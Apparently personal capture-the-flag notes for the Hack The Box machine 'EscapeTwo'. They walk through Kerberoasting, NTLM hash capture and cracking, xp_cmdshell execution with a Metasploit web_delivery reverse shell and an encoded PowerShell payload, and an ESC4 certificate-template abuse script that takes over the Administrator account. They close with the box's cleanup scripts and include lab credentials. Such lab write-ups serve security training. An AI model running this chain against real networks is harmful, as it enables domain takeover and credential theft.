# User flag

## 0. first cred
```As is common in real life Windows pentests, you will start this box with credentials for the following account: rose / KxEPkKe6R8su```
## 1. rustscan
```python
# Nmap 7.94SVN scan initiated Tue Mar 25 02:18:53 2025 as: /usr/lib/nmap/nmap --privileged -vvv -p 593,636,1433,3269,3268,5985,9389,47001,49664,49665,49666,49667,49689,49690,49695,49710,49726,49745,50158 -sC -sV -oN escapetwo 10.129.101.1
Nmap scan report for DC01.sequel.htb (10.129.101.1)
Host is up, received echo-reply ttl 127 (0.23s latency).
Scanned at 2025-03-25 02:18:53 EDT for 74s

PORT      STATE SERVICE    REASON          VERSION
593/tcp   open  ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap   syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
|_ssl-date: 2025-03-25T06:20:04+00:00; -1s from scanner time.
1433/tcp  open  ms-sql-s   syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.101.1:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-25T06:12:16
| Not valid after:  2055-03-25T06:12:16
| MD5:   7e51:de35:0ccc:e941:29a0:6203:5be0:545c
| SHA-1: 318f:b215:154d:585d:3ed3:d65f:2778:80c2:b6c1:2db8
| ms-sql-ntlm-info: 
|   10.129.101.1:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-03-25T06:20:04+00:00; -1s from scanner time.
3268/tcp  open  ldap       syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
|_ssl-date: 2025-03-25T06:20:04+00:00; -1s from scanner time.
3269/tcp  open  ssl/ldap   syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
|_ssl-date: 2025-03-25T06:20:04+00:00; -1s from scanner time.
5985/tcp  open  http       syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf     syn-ack ttl 127 .NET Message Framing
47001/tcp open  http       syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc      syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc      syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc      syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc      syn-ack ttl 127 Microsoft Windows RPC
```

## 2. Users
```python
SMB         10.129.101.1    445    DC01             sequel.htb\michael                        
SMB         10.129.101.1    445    DC01             sequel.htb\ryan                           
SMB         10.129.101.1    445    DC01             sequel.htb\oscar                          
SMB         10.129.101.1    445    DC01             sequel.htb\sql_svc                        
SMB         10.129.101.1    445    DC01             sequel.htb\rose                           
SMB         10.129.101.1    445    DC01             sequel.htb\ca_svc  
```

## 3. try kerberoasting
```python
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ GetUserSPNs.py sequel.htb/rose:KxEPkKe6R8su  -request -outputfile hash.txt

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: hash.txt
Time.Started.....: Tue Mar 25 02:40:23 2025 (19 secs)
Time.Estimated...: Tue Mar 25 02:40:42 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1476.1 kH/s (1.31ms) @ Accel:512 Loops:1 Thr:1 Vec:16
Recovered........: 0/2 (0.00%) Digests (total), 0/2 (0.00%) Digests (new), 0/2 (0.00%) Salts
Progress.........: 28688770/28688770 (100.00%)
Rejected.........: 0/28688770 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[212173657879616e67656c2121] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 68%
```
## 4. find certificate
```python
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ certipy find -u 'rose' -p 'KxEPkKe6R8su' -dc-ip 10.129.101.1 -stdout -vulnerable 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
```

## 5. Try mssql
```python
┌──(kali㉿kali)-[~/Desktop/htb/test]
└─$ nxc mssql 10.129.101.1 -u rose -p KxEPkKe6R8su  -q "SELECT name FROM master.dbo.sysdatabases"      
MSSQL       10.129.101.1    1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.129.101.1    1433   DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
MSSQL       10.129.101.1    1433   DC01             name:master
MSSQL       10.129.101.1    1433   DC01             name:tempdb
MSSQL       10.129.101.1    1433   DC01             name:model
MSSQL       10.129.101.1    1433   DC01             name:msdb

┌──(kali㉿kali)-[~/Desktop/htb/test]
└─$ mssqlclient.py sequel.htb/rose:'KxEPkKe6R8su'@10.129.101.1 -windows-auth

```

## 6. xp_dirtree get net_ntlm
```python
[SMB] NTLMv2-SSP Client   : 10.129.101.1
[SMB] NTLMv2-SSP Username : SEQUEL\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::SEQUEL:322c40b59da5ff1b:114B72F5ACC4DD091D97894D694D742E:01010000000000000002AF04349DDB01AAED8E753B322432000000000200080044004B004C00490001001E00570049004E002D004700470030003900320034005500370045005900520004003400570049004E002D00470047003000390032003400550037004500590052002E0044004B004C0049002E004C004F00430041004C000300140044004B004C0049002E004C004F00430041004C000500140044004B004C0049002E004C004F00430041004C00070008000002AF04349DDB01060004000200000008003000300000000000000000000000003000004B440DB88489C8AD21C88401E4813FC8CBB33012C2FBD4A4C556A58221A73CC80A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360034000000000000000000


┌──(kali㉿kali)-[~/Desktop/htb]
└─$ hashcat -a 0 -m 5600 'sql_svc::SEQUEL:322c40b59da5ff1b:114B72F5ACC4DD091D97894D694D742E:01010000000000000002AF04349DDB01AAED8E753B322432000000000200080044004B004C00490001001E00570049004E002D004700470030003900320034005500370045005900520004003400570049004E002D00470047003000390032003400550037004500590052002E0044004B004C0049002E004C004F00430041004C000300140044004B004C0049002E004C004F00430041004C000500140044004B004C0049002E004C004F00430041004C00070008000002AF04349DDB01060004000200000008003000300000000000000000000000003000004B440DB88489C8AD21C88401E4813FC8CBB33012C2FBD4A4C556A58221A73CC80A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360034000000000000000000'  /usr/share/wordlists/rockyou.txt

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 5600 (NetNTLMv2)
```

## 7. find sa password in file
```python
# in accounts.xlsx
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ nxc mssql 10.129.101.1 -u 'sa' -p 'MSSQLP@ssw0rd!'  --local-auth

MSSQL       10.129.101.1    1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.129.101.1    1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)


nxc mssql 10.129.101.1 -u 'sa' -p 'MSSQLP@ssw0rd!'  --local-auth -x "powershell.exe -nop -w hidden -e WwBOAGUAdA<SNIP>"

┌──(kali㉿kali)-[~/Desktop/htb]
└─$ msfconsole -q                                                                                  
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
[*] Starting persistent handler(s)...
msf6 > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set lhost 10.10.14.64
lhost => 10.10.14.64
msf6 exploit(multi/script/web_delivery) > set target 2
target => 2
msf6 exploit(multi/script/web_delivery) > set lport 4444
lport => 4444
msf6 exploit(multi/script/web_delivery) > run
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/script/web_delivery) > 
[*] Started reverse TCP handler on 10.10.14.64:4444 
[*] Using URL: http://10.10.14.64:8080/8odqeOJNi0
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1A
[*] 10.129.101.1     web_delivery - Delivering AMSI Bypass (1390 bytes)
[*] 10.129.101.1     web_delivery - Delivering Payload (3686 bytes)
[*] Sending stage (201798 bytes) to 10.129.101.1
[*] Meterpreter session 1 opened (10.10.14.64:4444 -> 10.129.101.1:61437) at 2025-03-25 04:19:18 -0400

# get shell and find this 
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"

# password spray and get ryan account
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ evil-winrm -i 10.129.101.1 -u 'ryan' -p 'WqSZAF6CysDQbGb3'                 
                                          
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents> cd ../
*Evil-WinRM* PS C:\Users\ryan> cd Desktop
*Evil-WinRM* PS C:\Users\ryan\Desktop> dir


    Directory: C:\Users\ryan\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        3/24/2025  11:12 PM             34 user.txt
```

# Root flag

![[Pasted image 20250325165203.png]]
## 1. ESC4
```python
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
```

## 2.there is a clean up script, try to do it fast
```bash
#!/bin/bash

target="ca_svc"
owned="ryan"
old_pass="WqSZAF6CysDQbGb3"
new_pass="test@123"
dc="10.129.247.234"
domain="sequel.htb"
template="DunderMifflinAuthentication"

owneredit.py  -action write -new-owner $owned -target $target -dc-ip $dc $domain/$owned:$old_pass
dacledit.py -action 'write' -rights 'FullControl' -principal $owned -target $target $domain/$owned:$old_pass
net rpc password $target $new_pass -U $domain/$owned%$old_pass -S $domain
#certipy-ad find -u $target -p $new_pass -dc-ip $dc -vulnerable -stdout -debug 

# ESC4
certipy-ad template -u $target -p $new_pass -dc-ip $dc -template $template -save-old
certipy-ad req -u $target -p $new_pass -dc-ip $dc -template $template -upn Administrator -ca sequel-DC01-CA
certipy-ad auth -pfx administrator.pfx -username Administrator -domain $domain


┌──(kali㉿kali)-[~/Desktop/htb]
└─$ evil-winrm -i 10.129.101.1 -u 'Administrator' -H 7a8d4e04986afa8ed4060f75
```

# Beyond Root
## 3. Check the cleanup script
```python
*Evil-WinRM* PS C:\Users\Administrator\Desktop> (Get-ScheduledTask -TaskName "Cleanup_script_1min").Actions


Id               :
Arguments        : -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Documents\Cleanup\clean_1min.ps1
Execute          : powershell.exe
WorkingDirectory :
PSComputerName   :

# the template
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type C:\Users\Administrator\Documents\Cleanup\clean_1min.ps1
Import-Module ActiveDirectory

$cleanup_dir            = "C:\Users\Administrator\Documents\Cleanup"
$template_path          = "CN=DunderMifflinAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=sequel,DC=htb"
$template_sddl_path = $cleanup_dir + "\DunderMifflinAuthentication_SecurityDescriptor.sddl"
$ldf_path                       = $cleanup_dir + "\DunderMifflinAuthentication_backup.ldf"

Function export_template {
        if ((Test-Path $template_sddl_path) -and (Test-Path $ldf_path)) {
            Write-Host "Both files exist."
        } else {
                # mkdir $cleanup_dir
            ldifde -f $ldf_path -d $template_path -m
                $template = Get-ADObject -Identity $template_path -Properties nTSecurityDescriptor
                $securityDescriptor = $template.nTSecurityDescriptor
                $securityDescriptorSddl = $securityDescriptor.GetSecurityDescriptorSddlForm("All")
                Set-Content -Path $template_sddl_path -Value $securityDescriptorSddl
                icacls $template_sddl_path /deny "*S-1-5-18:(DE,WDAC)"
                icacls $ldf_path /deny "*S-1-5-18:(DE,WDAC)"
                attrib +R $template_sddl_path
                attrib +R $ldf_path
                Write-Host "Templates Exported!"
        }
}

Function import_template {
        Remove-ADObject -Identity $template_path -Confirm:$false -Recursive
        ldifde -i -f $ldf_path
        $sddl = Get-Content -Path $template_sddl_path
        $identity = $template_path
        $template = Get-ADObject -Identity $identity
        $securityDescriptor = New-Object System.DirectoryServices.ActiveDirectorySecurity
        $securityDescriptor.SetSecurityDescriptorSddlForm($sddl)
        Set-ADObject -Identity $identity -Replace @{nTSecurityDescriptor = $securityDescriptor}
        Write-Host "Templates Imported & ACLs Good to go!"
}

export_template
import_template*Evil-WinRM* PS C:\Users\Administrator\Desktop> type C:\Users\Administrator\Documents\Cleanup\clean_1min.ps1
Import-Module ActiveDirectory

$cleanup_dir            = "C:\Users\Administrator\Documents\Cleanup"
$template_path          = "CN=DunderMifflinAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=sequel,DC=htb"
$template_sddl_path = $cleanup_dir + "\DunderMifflinAuthentication_SecurityDescriptor.sddl"
$ldf_path                       = $cleanup_dir + "\DunderMifflinAuthentication_backup.ldf"

Function export_template {
        if ((Test-Path $template_sddl_path) -and (Test-Path $ldf_path)) {
            Write-Host "Both files exist."
        } else {
                # mkdir $cleanup_dir
            ldifde -f $ldf_path -d $template_path -m
                $template = Get-ADObject -Identity $template_path -Properties nTSecurityDescriptor
                $securityDescriptor = $template.nTSecurityDescriptor
                $securityDescriptorSddl = $securityDescriptor.GetSecurityDescriptorSddlForm("All")
                Set-Content -Path $template_sddl_path -Value $securityDescriptorSddl
                icacls $template_sddl_path /deny "*S-1-5-18:(DE,WDAC)"
                icacls $ldf_path /deny "*S-1-5-18:(DE,WDAC)"
                attrib +R $template_sddl_path
                attrib +R $ldf_path
                Write-Host "Templates Exported!"
        }
}

Function import_template {
        Remove-ADObject -Identity $template_path -Confirm:$false -Recursive
        ldifde -i -f $ldf_path
        $sddl = Get-Content -Path $template_sddl_path
        $identity = $template_path
        $template = Get-ADObject -Identity $identity
        $securityDescriptor = New-Object System.DirectoryServices.ActiveDirectorySecurity
        $securityDescriptor.SetSecurityDescriptorSddlForm($sddl)
        Set-ADObject -Identity $identity -Replace @{nTSecurityDescriptor = $securityDescriptor}
        Write-Host "Templates Imported & ACLs Good to go!"
}

export_template
import_template

# clean_5min.ps1
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type C:\Users\Administrator\Documents\Cleanup\clean_5min.ps1
Import-Module ActiveDirectory

$cleanup_dir            = "C:\Users\Administrator\Documents\Cleanup"
$ca_svc_path            = "CN=Certification Authority,CN=Users,DC=sequel,DC=htb"
$ca_svc_sddl_path       = $cleanup_dir + "\ca_svc_SecurityDescriptor.sddl"

Function disable_xp_cmdshell {
        Invoke-SqlCmd -ServerInstance "(local)" -Query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;"
        Invoke-SqlCmd -ServerInstance "(local)" -Query "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;"
        Write-Host "xp_cmdshell is disabled!"
}

Function export_acls_ca_svc {
        if ((Test-Path $ca_svc_sddl_path)) {
            Write-Host "$ca_svc_sddl_path files exist."
        } else {
                $ca_svc = Get-ADObject -Identity $ca_svc_path -Properties nTSecurityDescriptor
                $securityDescriptor = $ca_svc.nTSecurityDescriptor
                $securityDescriptorSddl = $securityDescriptor.GetSecurityDescriptorSddlForm("All")
                Set-Content -Path $ca_svc_sddl_path -Value $securityDescriptorSddl
                icacls $ca_svc_sddl_path /deny "*S-1-5-18:(DE,WDAC)"
                attrib +R $ca_svc_sddl_path
                Write-Host "ca_svc's ACLs are Exported!"
        }
}

Function revert_acls_ca_svc {
        $sddl = Get-Content -Path $ca_svc_sddl_path
        $identity = $ca_svc_path
        $template = Get-ADObject -Identity $identity
        $securityDescriptor = New-Object System.DirectoryServices.ActiveDirectorySecurity
        $securityDescriptor.SetSecurityDescriptorSddlForm($sddl)
        Set-ADObject -Identity $identity -Replace @{nTSecurityDescriptor = $securityDescriptor}
        $path = "AD:"+$ca_svc_path
        $user = new-object system.security.principal.ntaccount("Domain Admins");
        $acl = Get-Acl -Path $path
        $acl.SetOwner($user)
        Set-Acl -Path $path $acl
        net user ca_svc AtN3VI42n4BG
        Write-Host "ca_svc is back to normal!"
}

export_acls_ca_svc
revert_acls_ca_svc
disable_xp_cmdshell

```
